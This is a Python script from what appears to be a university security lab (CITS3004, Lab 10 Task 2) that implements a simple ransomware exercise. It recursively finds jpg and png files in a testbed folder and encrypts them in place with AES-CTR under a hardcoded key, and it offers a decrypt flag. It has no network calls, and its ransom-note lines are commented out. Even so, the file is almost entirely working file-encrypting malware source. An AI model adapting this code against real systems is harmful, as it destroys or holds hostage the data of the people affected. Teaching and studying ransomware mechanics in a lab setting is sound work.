
#!/usr/bin/env python

# Import libs
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode
import json
import argparse
import os

# Run with:    
# cls && python3 ransomware.py
# cls && python3 ransomware.py --decrypt


# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  Set to either: '128/192/256 bit plaintext key' or False
#  Key length is 16/24/32 chars long
HARDCODED_KEY = b'veryweakpassword'
INITIALVECTOR = b'1111111111111111'

# Directory list to encrypt
# startdirs = ['/home/seed/Labs/Lab10/Task2/Testing']
startdirs = ['C:\\Users\\David\\GitHub Repos\\CITS3004_Code\\Labs\\Lab10\\Task2\\testbed'] 



###########    READ BEFORE USING!   ################
# Usage
# Select the folder to run the ransomware
# Go to discover.py and specify the file extensions to be encrypted
# Run the main function [python ransomware.py]
# You can check the specified files are no longer available to access
# You can run the main function to decrypt [python ransomware.py -d]
# Use the decryption key provided to decrypt
# Please be careful with this program



def discoverFiles(startpath):
    '''
    Goes through all of the contents from the :startpath and any subfolders 
    within and collects all the file information where the extensions are specified.
    '''
    # You can specify the file extensions you want to encrypt.
    # Specify them as a string e.g., 'jpg', 'bmp'
    # Don't put a dot in front!
    extensions = ["jpg", "png"]

    for dirpath, dirs, files in os.walk(startpath):

        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def discoverFileChecker(path='/'):
    '''
    Checks that discoverFile function is working correctly.
    You can provide the path to a folder, it will search all of its subfolders
    and display the specified extensions.
    by default, it will search from the root folder.    
    '''
    x = discoverFiles(path)
    for i in x:
        print(i)


def modify_file_inplace(filename, crypto, encrypt=True, blocksize=16):
    '''
    This function encrypts
    Open `filename` and encrypt/decrypt according to `crypto`

    :filename: a filename (preferably absolute path)
    :crypto: a stream cipher function that takes in a plaintext, 
            and returns a ciphertext of identical length
    :blocksize: length of blocks to read and write.
    :return: None
    '''

    with open(filename, 'r+b') as f:
        plaintext = f.read(blocksize)
        
        while plaintext:
            ciphertext = ''
            if encrypt:
                if len(plaintext) < blocksize:
                    padded = pad(plaintext, blocksize)
                    ciphertext = crypto.encrypt(padded)
                else:
                    ciphertext = crypto.encrypt(plaintext)
            else:
                deciphered = crypto.decrypt(plaintext)
                if len(deciphered) < blocksize:
                    ciphertext = unpad(deciphered, blocksize)
                else:
                    ciphertext = deciphered
            f.seek(-len(plaintext), 1) # return to same point before the read
            f.write(ciphertext)
            plaintext = f.read(blocksize)


def get_parser():
    parser = argparse.ArgumentParser(description='ransomware exercise')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser




def main():

    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        
        print("###### DECRYPTION")
        # print("Your files have been locked!")
        # print("Please use the below decryption key provided to unlock your files.")
        # print("Your decryption key is: '{}' \n".format(HARDCODED_KEY.decode()))

        # decryption_key = input('Enter Your Key> ')
        # decryption_key = decryption_key.encode('utf-8')

        # Variables
        decryption_key = HARDCODED_KEY.decode().encode('utf-8')
        iv = INITIALVECTOR
        # Carry out decryption
        # Using CBC mode (Given)
        #crypt = AES.new(decryption_key, AES.MODE_CBC, iv)

        # Using CTR mode (Task 2)
        crypt = AES.new(decryption_key, AES.MODE_CTR, counter=Counter.new(128))

        for currentDir in startdirs:
            for file in discoverFiles(currentDir):
                print("Decrypted: " + str(file))
                modify_file_inplace(file, crypt, False)

    else:
        print("###### ENCRYPTION")
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more		
        # DON'T uncomment below, unless you really want to ruin your files
        # else:
        ##########  key = random(32)

        # Variables
        iv = INITIALVECTOR
        encryption_key = HARDCODED_KEY

        # Carry out encryption
        # Using CBC mode (Given)
        # crypt = AES.new(encryption_key, AES.MODE_CBC, iv)

        # Using CTR mode (Task 2)
        crypt = AES.new(encryption_key, AES.MODE_CTR, counter=Counter.new(128))

        for currentDir in startdirs:
            for file in discoverFiles(currentDir):
                print("Encrypted: " + str(file))
                modify_file_inplace(file, crypt)


if __name__ == "__main__":
    print("#################### RANSOMWARE - Lab 10 - Task 2 ####################")
    main()
    print("")
